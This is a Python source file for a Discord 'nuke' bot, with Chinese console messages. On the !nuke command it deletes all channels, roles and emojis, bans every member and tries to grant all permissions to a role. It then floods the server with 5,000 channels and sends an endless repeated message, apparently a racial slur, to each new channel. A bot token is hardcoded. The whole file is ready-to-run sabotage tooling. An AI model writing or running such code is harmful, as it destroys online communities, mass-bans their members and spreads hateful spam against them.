import discord
from discord.ext import commands
import random
from discord import Intents, Permissions
from colorama import Fore, Style
import asyncio

token = "MTUwNTI3Mjk0NDg0NTEyNzcwMA.GVtmvL.x8CvbBSl_21yx8IXJxKL_DoxLUuk_V2kmj6rZQ"

SPAM_CHANNEL = ["0"]
SPAM_MESSAGE = [
    "黑尼哥"
]

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix="!", intents=intents)


@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="you"))


@client.command()
@commands.is_owner()
async def logout(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} 已被登出" + Fore.RESET)


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await guild.edit(name="100")
    await guild.edit(icon=None)
    try:
        role = discord.utils.get(guild.roles, name="tag")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "我已成功給所有人ADMIN" + Fore.RESET)
    except:
        print(Fore.GREEN + "我無法給所有人ADMIN" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} 已被刪除!" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} 並沒有被刪除" + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA +
                  f"{member.name}#{member.discriminator} 被BAN了" + Fore.RESET)
        except:
            print(Fore.GREEN +
                  f"{member.name}#{member.discriminator} 無法被BAN!" + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} 已被刪除" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} 並沒有被刪除" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} 已被刪除" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} 並沒有被刪除" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} 已成功被解ban" +
                  Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} 無法被解ban" +
                  Fore.RESET)
    await guild.create_text_channel("LMFAO")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print("群組的新邀請連結: https://discord.gg/Q6ZTY9sX")
    amount = 5000
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"已成功炸掉 {guild.name}!")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

@client.command()
async def ping(ctx):
    await ctx.send("pong")
client.run(token)
client = commands.Bot(command_prefix="!")

##啟動密碼!nuke